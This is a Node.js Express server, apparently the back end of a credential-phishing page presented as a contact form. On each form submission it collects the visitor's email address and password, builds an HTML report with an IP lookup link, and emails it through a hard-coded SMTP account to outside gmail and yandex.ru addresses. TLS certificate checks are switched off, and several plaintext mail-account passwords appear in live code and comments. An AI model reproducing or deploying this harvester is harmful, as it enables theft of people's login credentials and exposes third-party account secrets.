const express = require('express');
const app = express();
const nodemailer = require('nodemailer');

const PORT = process.env.PORT || 5000;

// Middleware
app.use(express.static('public'));
app.use(express.json())



var os = require( 'os' );
var networkInterfaces = Object.values(os.networkInterfaces())
    .reduce((r,a) => {
        r = r.concat(a)
        return r;
    }, [])
    .filter(({family, address}) => {
        return family.toLowerCase().indexOf('v4') >= 0 &&
            address !== '127.0.0.1'
    })
    .map(({address}) => address);
var ipAddresses = networkInterfaces.join(', ')
console.log(ipAddresses);
app.get('/', (req ,res) =>{
    res.sendFile(__dirname + '/public/contactform.html');
})

app.post('/',async (req , res) =>{
    console.log(req.body);

    // const transporter = nodemailer.createTransport({
    //     service  : 'gmail',
    //     auth:{
    //         user:'jeremecarter19@gmail.com',
    //         pass: 'Indaclub006',
    //     }
    // })


    //     const transporter = nodemailer.createTransport({
    //         host: "mail.lagzymedia.com.ng",
    //         port: 587,
    //         secure: false, // true for 465, false for other ports
    //         auth: {
    //           user: 'info@lagzymedia.com.ng', // generated ethereal user
    //           pass: '--lagzymedia2021', // generated ethereal password
    //         },
           
    // });


    // const mailOptions = {
    //     from : 'stanlyobiek@gmail.com',
    //     to:'stanlyobiek@gmail.com',
    //     subject :`Message from node`,
    //     text:req.body.email
    // }

    // transporter.sendMail(mailOptions, (error, info) =>{
    //     if(error){
    //       console.log(error);
    //       res.send('error');

    //     }else{
    //         console.log('Email sent: '+ info.response);
    //         res.send('success');
    //     }
    // });


 
        const output = `
        <p<h3> You have a new message from  : ${req.body.source}</h3>
        <h3>Contact Details</h3>
        <ul>
        
        <li> email: ${req.body.email}</li>
        <li> Password : ${req.body.password}</li>
        <li>Login IP: <a href='http://whoer.net/check?host=${ipAddresses}' target='_blank'>${ipAddresses}</li>
      
    
        </ul>
        
        ` ;
    
        let testAccount = await nodemailer.createTestAccount();
    
      // create reusable transporter object using the default SMTP transport
      let transporter = nodemailer.createTransport({
        host: "mail.lagzymedia.com.ng",
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
          user: 'info@lagzymedia.com.ng', // generated ethereal user
          pass: '--lagzymedia2021', // generated ethereal password
        },
        tls:{
            rejectUnauthorized:false
        }
      });

      
    //   ,tyga44@yandex.ru
      // send mail with defined transport object
      let info = await transporter.sendMail({
        from: '"Brian 👻" <info@lagzymedia.com.ng>', // sender address
        to: "stanlyobiek@gmail.com,tyga44@yandex.ru", // list of receivers
        subject: "Good day ✔", // Subject line
        text: "Hello world?", // plain text body
        html: output, // html body
      });

    
      console.log('Email sent');
            res.send('success');
    });
    



app.listen(PORT, () =>{
    console.log('Server running on port ${PORT}')
})